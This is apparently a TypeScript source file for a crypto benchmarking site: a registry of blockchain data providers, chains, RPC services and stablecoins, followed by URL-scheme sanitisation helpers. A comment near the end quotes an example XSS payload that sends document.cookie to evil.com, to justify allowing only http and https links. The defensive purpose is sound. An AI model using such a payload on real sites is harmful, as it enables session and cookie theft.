/**
 * Provider registry. Optional enrichment for each provider slug that
 * appears in one or more benchmark specs.
 *
 * The registry is purely additive. Providers without an entry still
 * render at /providers/<slug>, they just lack the description, URL,
 * and Twitter handle. Add a new entry when onboarding a provider.
 *
 * Keep descriptions sober and technical. One or two short sentences,
 * factual, no marketing adjectives. Twitter handle without the URL.
 */

export type ProviderRegistryEntry = {
  url: string;
  description: string;
  twitter?: string;

  // Optional rich content surfaced on the product detail page when present.
  // Every field is independently optional; the page renders only the
  // sections that have data, so partial enrichment is safe.
  longDescription?: string;
  chains?: string[];
  features?: string[];
  pricing?: string;
  founded?: number;
  docs?: string;
  github?: string;
  blog?: string;

  /** Parent product slug when this entry is a sub-product of a broader
   * brand (e.g. helius-sender → helius). The product page surfaces a
   * "Part of <parent>" badge and the parent page lists its sub-products.
   * Sub-products keep their own bench rankings — this is editorial
   * cross-linking, not data merging. */
  parent?: string;
};

export const PROVIDER_REGISTRY: Record<string, ProviderRegistryEntry> = {
  // ─── Data aggregator APIs ─────────────────────────────────────
  mobula: {
    url: "https://mobula.io",
    description:
      "Onchain data aggregator covering 80+ chains. WebSocket fast-trade feed, REST market and metadata, wallet portfolio APIs.",
    twitter: "@MobulaFi",
  },
  codex: {
    url: "https://www.codex.io",
    description:
      "Onchain market data API for EVM and Solana. GraphQL and WebSocket feeds for tokens, pairs, trades, and pricing.",
    twitter: "@CodexData",
  },
  geckoterminal: {
    url: "https://www.geckoterminal.com",
    description:
      "DEX data terminal by CoinGecko covering 200+ chains. REST API for pools, tokens, trades, and OHLCV.",
    twitter: "@GeckoTerminal",
  },
  jupiter: {
    url: "https://jup.ag",
    description:
      "Solana swap aggregator. REST APIs for quotes, swap routing, price, and token lists across Solana DEXs.",
    twitter: "@JupiterExchange",
  },
  raydium: {
    url: "https://raydium.io",
    description:
      "Solana AMM with both standard constant-product pools and concentrated liquidity (CLMM). Trade API exposes single-venue swap quotes and route construction over Raydium-owned liquidity only — not an aggregator.",
    twitter: "@RaydiumProtocol",
  },
  openocean: {
    url: "https://openocean.finance",
    description:
      "Multi-chain DEX aggregator. v4 swap API quotes and routes across EVM chains and Solana, aggregating across multiple AMMs with gas-aware path selection.",
    twitter: "@OpenOceanGlobal",
  },
  moralis: {
    url: "https://moralis.io",
    description:
      "Multi-chain Web3 data API across EVM chains and Solana. REST endpoints for tokens, NFTs, wallets, balances, and prices.",
    twitter: "@MoralisWeb3",
  },
  helius: {
    url: "https://www.helius.dev",
    description:
      "Solana RPC and data provider. Enhanced transactions, webhooks, DAS API for assets, and standard JSON-RPC.",
    twitter: "@heliuslabs",
  },
  dune: {
    url: "https://dune.com",
    description:
      "Onchain analytics platform. SQL-queryable indexed data across EVM chains and Solana, public dashboards, plus the Sim REST API for wallet balances, transactions, token info, holders, and DeFi positions across 60+ EVM mainnets.",
    twitter: "@DuneAnalytics",
  },
  coinpaprika: {
    url: "https://coinpaprika.com",
    description:
      "Independent crypto market data API. Token prices, OHLCV, exchange tickers, and contract/platform lookups across 300+ supported chains. Public free tier with no auth.",
    twitter: "@coinpaprika",
  },
  covalent: {
    url: "https://goldrush.dev",
    description:
      "Multichain onchain data API by GoldRush (formerly Covalent). Unified REST endpoints for wallet balances, transactions, NFTs, and pricing across 100+ EVM chains.",
    twitter: "@goldrushdev",
  },
  coinstats: {
    url: "https://coinstats.app",
    description:
      "Portfolio tracker and market data API. REST endpoints for prices, exchanges, NFTs, and wallet balances across 100+ blockchains. Consumer app + paid API tiers.",
    twitter: "@CoinStats",
  },

  // ─── Solana transaction landing services ──────────────────────
  jito: {
    url: "https://www.jito.wtf",
    description:
      "Solana MEV infrastructure. Block Engine runs an off-chain tip auction for atomic bundles, the oldest production transaction-landing service on Solana.",
    twitter: "@jito_labs",
  },
  "helius-sender": {
    url: "https://www.helius.dev/docs/sending-transactions/sender",
    description:
      "Helius transaction sender for Solana. Dual-path submission to Jito and SWQoS staked validators from 7 regional endpoints, no API credit cost.",
    twitter: "@heliuslabs",
    parent: "helius",
  },
  nozomi: {
    url: "https://www.temporal.xyz/nozomi",
    description:
      "Solana transaction landing service by Temporal Labs. Direct-to-leader submission from 9 colocated regions, tip paid only on successful landing.",
    twitter: "@temporal_xyz",
  },
  bloxroute: {
    url: "https://bloxroute.com",
    description:
      "Solana Trader API over the bloXroute BDN. Multi-path leader-aware propagation across bare-metal RPCs, dedicated nodes, and SWQoS for institutional flow.",
    twitter: "@bloXrouteLabs",
  },
  "0slot": {
    url: "https://0slot.trade",
    description:
      "Solana transaction landing service. SWQoS-based premium sender with globally distributed endpoints (Frankfurt, Amsterdam, NY, Tokyo, LA) and tip-based prioritization.",
    twitter: "@0slot_trade",
  },
  nextblock: {
    url: "https://nextblock.io",
    description:
      "Solana transaction landing service. SWQoS sender backed by a large stake pool, plus a TX Stream API for low-latency mempool-style transaction feeds.",
    twitter: "@nextblock_sol",
  },
  astralane: {
    url: "https://astralane.io",
    description:
      "Solana transaction landing service. Iris sender uses validator co-location and leader-schedule-aware routing for p90 sub-slot latency on high-frequency workloads.",
    twitter: "@Astralaneio",
  },
  solanavibestation: {
    url: "https://solanavibestation.com",
    description:
      "Solana transaction landing service. Lightspeed sender routes through SVS's own ~101K SOL validator pool with co-located bare-metal infra in Atlanta and Amsterdam.",
    twitter: "@solvibestation",
  },

  // ─── Bridges ──────────────────────────────────────────────────
  relay: {
    url: "https://relay.link",
    description:
      "Cross-chain intent network from Reservoir. Users sign an intent, relayers compete to fill on the destination, settlement is typically sub-30 seconds.",
    twitter: "@RelayProtocol",
  },
  lifi: {
    url: "https://li.fi",
    description:
      "Cross-chain bridge and DEX aggregator. Routes swaps across bridges and liquidity sources via a single API, with EVM and Solana support.",
    twitter: "@lifiprotocol",
  },
  debridge: {
    url: "https://debridge.finance",
    description:
      "Cross-chain intent protocol using the DLN solver network. Liquidity is filled by solvers on the destination chain, no wrapped assets or LP pools.",
    twitter: "@deBridgeFinance",
  },

  // ─── Perp DEX ─────────────────────────────────────────────────
  lighter: {
    url: "https://lighter.xyz",
    description:
      "Onchain perp DEX with a fully onchain orderbook on a zkSync rollup. ZK proofs verify matching, no off-chain sequencer for trade execution.",
    twitter: "@Lighter_xyz",
  },
  hyperliquid: {
    url: "https://hyperliquid.xyz",
    description:
      "Onchain perp DEX on the Hyperliquid L1. Fully onchain orderbook with sub-second matching, no off-chain matching engine.",
    twitter: "@HyperliquidX",
  },
  dydx: {
    url: "https://dydx.trade",
    description:
      "Perp DEX on the dYdX Chain, a Cosmos SDK appchain. Orderbook with off-chain matching and onchain settlement, validators propagate orders via the mempool.",
    twitter: "@dYdX",
  },
  gmx: {
    url: "https://gmx.io",
    description:
      "Perp DEX on Arbitrum and Avalanche. Pool-based execution against GLP and GM vaults, oracle-priced trades with no orderbook.",
    twitter: "@GMX_IO",
  },
  gains: {
    url: "https://gains.trade",
    description:
      "Perp DEX on Polygon, Arbitrum, Base and Solana. Pool-based execution against the gToken vaults, oracle-priced trades with synthetic leverage.",
    twitter: "@GainsNetwork_io",
  },

  // ─── Wallet labels / explorers ────────────────────────────────
  blockscout: {
    url: "https://www.blockscout.com",
    description:
      "Open-source multi-chain EVM block explorer. Exposes address tags and public labels through its REST and JSON-RPC APIs.",
    twitter: "@blockscoutcom",
  },
  oli: {
    url: "https://www.openlabelsinitiative.org",
    description:
      "Open Labels Initiative, a community standard and shared dataset for EVM address labels. Distributes labels via GitHub and a public API.",
    twitter: "@open_labels",
  },
  tonapi: {
    url: "https://tonapi.io",
    description:
      "REST API for the TON blockchain. Returns account metadata, known entity names, and address book labels for TON wallets.",
    twitter: "@tonapi_io",
  },
  stellarexpert: {
    url: "https://stellar.expert",
    description:
      "Block explorer for the Stellar network. Provides a directory API of curated account labels, anchors, and known issuers.",
    twitter: "@stellarexpert",
  },
  xrpscan: {
    url: "https://xrpscan.com",
    description:
      "Block explorer for the XRP Ledger. Offers a public REST API with account info and known wallet names via its names endpoint.",
    twitter: "@xrpscan",
  },
  walletexplorer: {
    url: "https://www.walletexplorer.com",
    description:
      "Bitcoin address clusterer and labeler. Tracks exchange deposit clusters, mixers, and known services since 2013.",
  },

  // ─── L1 chains ────────────────────────────────────────────────
  bnb: {
    url: "https://www.bnbchain.org",
    description:
      "Proof-of-Staked-Authority L1 with 21 active validators rotating per epoch. Probabilistic finality reached after roughly 2 blocks. Block time around 3 seconds.",
    twitter: "@BNBCHAIN",
  },
  avalanche: {
    url: "https://www.avax.network",
    description:
      "Primary Network runs the Snowman BFT consensus derived from Snow protocols. Sub-second deterministic finality with no chain reorganizations.",
    twitter: "@avax",
  },
  sui: {
    url: "https://sui.io",
    description:
      "Move-based L1 using Mysticeti BFT consensus over a DAG. Owned-object transactions bypass consensus via Fast Path. Deterministic finality under one second.",
    twitter: "@SuiNetwork",
  },
  ton: {
    url: "https://ton.org",
    description:
      "BFT Proof-of-Stake L1 with a sharded masterchain and workchain architecture. Deterministic finality within a few seconds. Block time near 5 seconds.",
    twitter: "@ton_blockchain",
  },
  stellar: {
    url: "https://stellar.org",
    description:
      "Federated Byzantine Agreement via the Stellar Consensus Protocol with quorum slices. Deterministic finality per ledger close, roughly every 5 seconds.",
    twitter: "@StellarOrg",
  },
  solana: {
    url: "https://solana.com",
    description:
      "Proof-of-History sequencing combined with Tower BFT consensus. Probabilistic finality at 32 confirmed slots. Slot time around 400 milliseconds.",
    twitter: "@solana",
  },
  tron: {
    url: "https://tron.network",
    description:
      "DPoS L1 with 27 elected Super Representatives. 3-second block times and deterministic finality after about 19 confirmations.",
    twitter: "@trondao",
  },
  ethereum: {
    url: "https://ethereum.org",
    description:
      "PoS chain using Gasper (Casper FFG plus LMD-GHOST). 12-second slots with deterministic finality every two epochs, roughly 12.8 minutes.",
    twitter: "@ethereum",
  },
  cardano: {
    url: "https://cardano.org",
    description:
      "Ouroboros Praos PoS with 20-second slots and 1 block per 20 seconds on average. Probabilistic finality after about 2,160 blocks (k parameter).",
    twitter: "@Cardano",
  },
  litecoin: {
    url: "https://litecoin.org",
    description:
      "PoW chain with 2.5-minute block times and Scrypt mining. UTXO model inherited from Bitcoin with subsidy halvings every 840,000 blocks.",
    twitter: "@litecoin",
  },
  monero: {
    url: "https://www.getmonero.org",
    description:
      "Privacy-focused PoW chain using RandomX, tuned for CPU mining. 2-minute block times with ring signatures of size 16 and stealth addresses by default.",
    twitter: "@monero",
  },

  // ─── Ethereum L2 rollups ──────────────────────────────────────
  arbitrum: {
    url: "https://arbitrum.io",
    description:
      "Optimistic rollup built on Nitro stack with a fast-finality sequencer. Sub-second block times (~250 ms) via a 250 ms default block interval, far below the 2 s OP Stack convention. 7-day fraud-proof window for L1 finality.",
    twitter: "@arbitrum",
  },
  optimism: {
    url: "https://www.optimism.io",
    description:
      "Optimistic rollup and the canonical OP Stack reference implementation. 2-second sequencer block time, 7-day fraud-proof window, anchored to Ethereum L1 via batch submissions to the Optimism Portal.",
    twitter: "@Optimism",
  },
  base: {
    url: "https://www.base.org",
    description:
      "Coinbase-operated optimistic rollup on the OP Stack. 2-second sequencer block time, shared bridge with Optimism via the OP Superchain, fastest-growing L2 by TVL since 2024.",
    twitter: "@base",
  },
  blast: {
    url: "https://blast.io",
    description:
      "OP Stack fork with native ETH and stablecoin yield baked into the L2 protocol (ETH rebases via Lido, USDB via MakerDAO). 2-second sequencer block time, otherwise stock OP Stack.",
    twitter: "@Blast_L2",
  },
  mantle: {
    url: "https://www.mantle.xyz",
    description:
      "Modular OP Stack fork using EigenDA for data availability rather than Ethereum calldata, cutting L1 anchoring cost. 2-second sequencer block time, MNT token for gas (ETH-pegged).",
    twitter: "@Mantle_Official",
  },
  linea: {
    url: "https://linea.build",
    description:
      "ConsenSys zkEVM rollup with a prover-bound block cadence. Idle periods batch into longer intervals (p50 around 3-6 s) while busy periods produce blocks closer to the nominal 2 s mark.",
    twitter: "@LineaBuild",
  },
  scroll: {
    url: "https://scroll.io",
    description:
      "Native bytecode-equivalent zkEVM rollup. Sequencer cadence is prover-bound: empty periods see longer gaps between blocks while busy minutes produce blocks at a sub-3-second rate.",
    twitter: "@Scroll_ZKP",
  },
  zksync: {
    url: "https://zksync.io",
    description:
      "Matter Labs' zk-rollup with the ZK Stack reference implementation and a custom LLVM-based VM (EraVM). Batched producer with variable block cadence (p50 ~3-6 s) tied to proof generation rather than fixed sequencer intervals.",
    twitter: "@zksync",
  },
  taiko: {
    url: "https://taiko.xyz",
    description:
      "Based rollup: Ethereum L1 validators sequence the L2 directly via Taiko Inbox contracts, no separate sequencer. Block time around 3 seconds. Fundamentally different trust model from the operator-sequenced rollups in the rest of the field.",
    twitter: "@taikoxyz",
  },

  // ─── Public RPC providers ─────────────────────────────────────
  publicnode: {
    url: "https://www.publicnode.com",
    description:
      "Public no-key RPC service operated by Allnodes covering 70+ chains. JSON-RPC and WebSocket endpoints with archive support on most networks.",
    twitter: "@AllnodesHQ",
  },
  drpc: {
    url: "https://drpc.org",
    description:
      "Decentralized RPC mesh routing requests across third-party node providers with consensus checks. Free public tier plus higher-tier authenticated access.",
    twitter: "@drpcorg",
  },
  "1rpc": {
    url: "https://1rpc.io",
    description:
      "Privacy-preserving public RPC by Automata Network. Strips client metadata before forwarding to upstream node operators; load-balanced across providers.",
    twitter: "@1RPC_io",
  },
  meowrpc: {
    url: "https://meowrpc.com",
    description:
      "Free public RPC service covering Ethereum, Base, Arbitrum, Optimism and other EVM chains. No registration required, modest rate limits per IP.",
  },
  flashbots: {
    url: "https://rpc.flashbots.net",
    description:
      "Flashbots Protect RPC sends transactions through a private mempool, shielding them from sandwich attacks. Read calls go to a standard Ethereum node behind the proxy.",
    twitter: "@flashbots",
  },
  cloudflare: {
    url: "https://cloudflare-eth.com",
    description:
      "Cloudflare's public Ethereum gateway. Recently switched to a permissioned mode for many JSON-RPC methods, returning `-32046 Cannot fulfill request` for most endpoints.",
    twitter: "@Cloudflare",
  },
  "base-official": {
    url: "https://mainnet.base.org",
    description:
      "Official Base public RPC operated by the Base team (Coinbase). No-key access for read methods; documented as best-effort with rate limits.",
    twitter: "@base",
    parent: "base",
  },
  binance: {
    url: "https://docs.bnbchain.org/docs/rpc",
    description:
      "Official BNB Chain RPC endpoints operated by Binance. Multiple dataseed hosts (`bsc-dataseed1.binance.org` etc.) round-robin for load distribution.",
    twitter: "@BNBCHAIN",
  },
  tenderly: {
    url: "https://tenderly.co",
    description:
      "Tenderly's public gateway exposes a no-key JSON-RPC endpoint per chain at `gateway.tenderly.co/public/<slug>`. Covers Ethereum, Polygon, Arbitrum, Optimism, Base, Avalanche, Linea, Scroll and Mantle. The same Tenderly platform behind the keyed Web3 dev suite.",
    twitter: "@TenderlyApp",
  },
  nodies: {
    url: "https://nodies.app",
    description:
      "Nodies is the surviving public-RPC frontend for POKT Network's decentralized infrastructure. Per-chain subdomains like `eth-pokt.nodies.app`, `polygon-pokt.nodies.app`, `arb-pokt.nodies.app`. Covers most major EVM chains no-key.",
    twitter: "@nodies_app",
  },
  lava: {
    url: "https://www.lavanet.xyz",
    description:
      "Lava Network is a decentralized RPC mesh with permissionless validators. Public no-key endpoints work for Ethereum (`eth1.lava.build`) and Arbitrum (`arb1.lava.build`); other chains require an account-issued key.",
    twitter: "@lavanetxyz",
  },
  merkle: {
    url: "https://merkle.io",
    description:
      "Merkle exposes per-chain RPC subdomains (`eth.merkle.io`, `base.merkle.io`, `bsc.merkle.io`). Stable on Base + BSC for no-key benchmarking; Ethereum is fronted by an aggressive Cloudflare bot filter (20-minute lockout after a single request) so we exclude it from the leaderboard.",
    twitter: "@merkle_xyz",
  },
  "arbitrum-official": {
    url: "https://docs.arbitrum.io/build-decentralized-apps/reference/node-providers",
    description:
      "Arbitrum Foundation's public RPC endpoint at `arb1.arbitrum.io/rpc`. Best-effort, rate-limited, intended for dev access — production dapps are expected to use a keyed provider.",
    twitter: "@arbitrum",
    parent: "arbitrum",
  },
  "optimism-official": {
    url: "https://docs.optimism.io/builders/tools/build/node-providers",
    description:
      "Optimism Foundation's public RPC endpoint at `mainnet.optimism.io`. Best-effort, rate-limited, intended as a fallback. The Foundation recommends keyed providers for production load.",
    twitter: "@Optimism",
    parent: "optimism",
  },
  "avalanche-official": {
    url: "https://docs.avax.network/dapps/rpc-providers",
    description:
      "Ava Labs' public C-Chain RPC at `api.avax.network/ext/bc/C/rpc`. Best-effort, capped per IP. Production dapps usually graduate to keyed providers (Ankr, BlockDaemon, GetBlock).",
    twitter: "@avax",
    parent: "avalanche",
  },

  // ─── Gas oracles ──────────────────────────────────────────────
  blocknative: {
    url: "https://www.blocknative.com",
    description:
      "Mempool observability platform with a probability-of-inclusion gas oracle. EIP-1559 tier predictions exposed via the public /gasprices/blockprices endpoint, free tier without an API key.",
    twitter: "@blocknative",
  },
  "publicnode-feehistory": {
    url: "https://www.publicnode.com",
    description:
      "Gas predictor that wraps the canonical eth_feeHistory JSON-RPC method against PublicNode's Ethereum endpoint. Returns reward percentiles directly from the EIP-1559 spec implementation; no proprietary model.",
    twitter: "@AllnodesHQ",
    parent: "publicnode",
  },
  owlracle: {
    url: "https://owlracle.info",
    description:
      "Multi-oracle gas aggregator across Ethereum, BNB Chain, Polygon and other EVM chains. Free tier 100 requests/hour, 1000/h with a free API key. Recommendation aggregates several upstream oracles into a single tier value.",
    twitter: "@owlracle",
  },
  etherscan: {
    url: "https://etherscan.io/gastracker",
    description:
      "Most-visited Ethereum gas tracker on the web, operated by Etherscan. The v2 gastracker API exposes Safe / Propose / Fast tiers; the legacy single-price shape predates EIP-1559's per-tier priority-fee model.",
    twitter: "@etherscan",
  },

  // ─── Stablecoin issuers (appearing as providers in peg bench) ─
  usdc: {
    url: "https://www.circle.com/usdc",
    description:
      "Circle's USD-redeemed stablecoin, audited and backed by short-duration Treasuries and same-day USD cash. Same-day primary-market redemption with US banks is the structural anchor for the peg.",
    twitter: "@circle",
  },
  usdt: {
    url: "https://tether.to",
    description:
      "Tether's USD-pegged stablecoin, the dominant pair currency on most non-US crypto venues. Primary-market redemption is slower than USDC; secondary-market peg carries a premium during risk-on minutes.",
    twitter: "@Tether_to",
  },
  dai: {
    url: "https://makerdao.com",
    description:
      "MakerDAO's overcollateralized stablecoin (now Sky's USDS legacy version). CEX coverage is essentially dead in 2026; the only honest live peg signal is on-chain via Curve 3pool's get_dy.",
    twitter: "@MakerDAO",
  },
  fdusd: {
    url: "https://firstdigitallabs.com",
    description:
      "First Digital USD, Hong Kong-issued stablecoin backed 1:1 by USD reserves. Primary depth lives on Binance USDT-quoted FDUSDUSDT; USD-quoted venues offer negligible volume.",
    twitter: "@firstdigitallabs",
  },
  usde: {
    url: "https://ethena.fi",
    description:
      "Ethena's synthetic dollar anchored by a delta-neutral basis trade on perpetual futures. Flashed to $0.65 on Binance USDEUSDT during the October 10 2025 liquidation cascade.",
    twitter: "@ethena_labs",
  },

  // ─── Buyback audit (bench 018) ─────────────────────────────────
  sky: {
    url: "https://sky.money",
    description:
      "Rebrand of MakerDAO around USDS and SKY. Smart Burn Engine routes protocol surplus to buy and burn SKY against USDS on Uniswap v2.",
    twitter: "@SkyEcosystem",
  },

  // ─── Oracle deviation pairs (bench 025) ───────────────────────
  // Each "provider" in oracle-deviation is a USD trading pair. The entry
  // describes the underlying asset that the cross-oracle deviation
  // benchmark is measured against. Logos alias to the chain/asset image
  // in `lib/logo-manifest.ts`.
  "btc-usd": {
    url: "https://bitcoin.org",
    description:
      "Bitcoin, the first proof-of-work cryptocurrency. Treated as digital gold and the primary store-of-value asset across crypto markets.",
    twitter: "@Bitcoin",
  },
  "eth-usd": {
    url: "https://ethereum.org",
    description:
      "Ethereum, a proof-of-stake smart contract platform. Settlement layer for most DeFi, stablecoins, and L2 rollups; often called the world computer.",
    twitter: "@ethereum",
  },
  "sol-usd": {
    url: "https://solana.com",
    description:
      "Solana, a high-throughput monolithic L1 using proof-of-history with proof-of-stake. Low-latency execution layer for trading, payments, and consumer apps.",
    twitter: "@solana",
  },
  "bnb-usd": {
    url: "https://www.bnbchain.org",
    description:
      "BNB, the native asset of BNB Chain and Binance ecosystem. Used for gas on BNB Smart Chain and fee discounts on Binance exchange.",
    twitter: "@BNBCHAIN",
  },
  "xrp-usd": {
    url: "https://ripple.com/xrp",
    description:
      "XRP, the native asset of the XRP Ledger. Used for cross-border payments and liquidity bridging within the Ripple Labs ecosystem.",
    twitter: "@Ripple",
  },
  "ada-usd": {
    url: "https://cardano.org",
    description:
      "Cardano native token. PoS L1 using Ouroboros consensus, Haskell-based smart contracts via Plutus. ADA used for staking and fees.",
    twitter: "@Cardano",
  },
  "doge-usd": {
    url: "https://dogecoin.com",
    description:
      "Dogecoin native coin. Litecoin-derived PoW chain originating as a meme, widely used for tipping and small-value payments.",
    twitter: "@dogecoin",
  },
  "avax-usd": {
    url: "https://www.avax.network",
    description:
      "Avalanche native token. PoS L1 using Snowman consensus with a subnet architecture for app-specific chains. AVAX pays fees and secures the network.",
    twitter: "@avax",
  },
  "link-usd": {
    url: "https://chain.link",
    description:
      "Chainlink token. Powers a decentralized oracle network providing offchain data and compute, used for node payments and staking.",
    twitter: "@chainlink",
  },
  "matic-usd": {
    url: "https://polygon.technology",
    description:
      "Polygon ecosystem token, renamed from MATIC to POL in September 2024. Gas and staking asset across Polygon PoS and the AggLayer stack.",
    twitter: "@0xPolygon",
  },
};

/**
 * Scheme allowlist for any registry URL that ends up in an `<a href>` or
 * JSON-LD `sameAs` field. React does not block `javascript:` schemes on
 * `<a>` (it only warns in dev), so a malicious PR could inject
 * `javascript:fetch('//evil.com?'+document.cookie)` and exfiltrate
 * same-origin cookies/localStorage when the link is clicked.
 *
 * Returns the URL when safe, `undefined` when the scheme isn't http(s).
 * Callers should treat undefined as "no link" rather than rendering raw.
 */
export function safeRegistryURL(raw: string | undefined): string | undefined {
  if (!raw) return undefined;
  try {
    const u = new URL(raw);
    if (u.protocol === "http:" || u.protocol === "https:") return raw;
  } catch {
    // not a parseable URL — drop it
  }
  return undefined;
}

export function getProviderRegistry(slug: string): ProviderRegistryEntry | undefined {
  const entry = PROVIDER_REGISTRY[slug.toLowerCase()];
  if (!entry) return undefined;
  // Sanitise every URL-bearing field at the access boundary so render
  // sites don't have to remember to filter.
  return {
    ...entry,
    url: safeRegistryURL(entry.url) ?? "",
    docs: safeRegistryURL(entry.docs),
    github: safeRegistryURL(entry.github),
    blog: safeRegistryURL(entry.blog),
  };
}
